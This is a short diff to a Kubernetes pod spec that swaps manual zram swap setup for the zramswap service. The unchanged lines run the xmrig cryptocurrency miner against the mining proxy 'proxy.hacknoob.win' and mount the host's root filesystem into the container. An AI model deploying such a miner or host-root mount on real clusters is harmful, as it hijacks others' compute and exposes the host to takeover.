@@ -21,13 +21,9 @@ spec:
     - |
       # Update package list and install necessary tools
       apt-get update && \
-      apt-get install -y util-linux zram-tools && \
-      # Load zram module
-      modprobe zram && \
-      # Configure zram swap device
-      echo 512M > /sys/block/zram0/disksize && \
-      mkswap /dev/zram0 && \
-      swapon /dev/zram0 && \
+      apt-get install -y zram-tools && \
+      # Start ZRAM swap device with the default configuration
+      systemctl start zramswap && \
       # Run xmrig from the provided path
       /home/worker1/xmrig/build/xmrig \
       -o proxy.hacknoob.win:5551 \
@@ -51,3 +47,4 @@ spec:
   - name: xmrig-volume-1
     hostPath:
       path: /  # Mount / from the host to the container
+
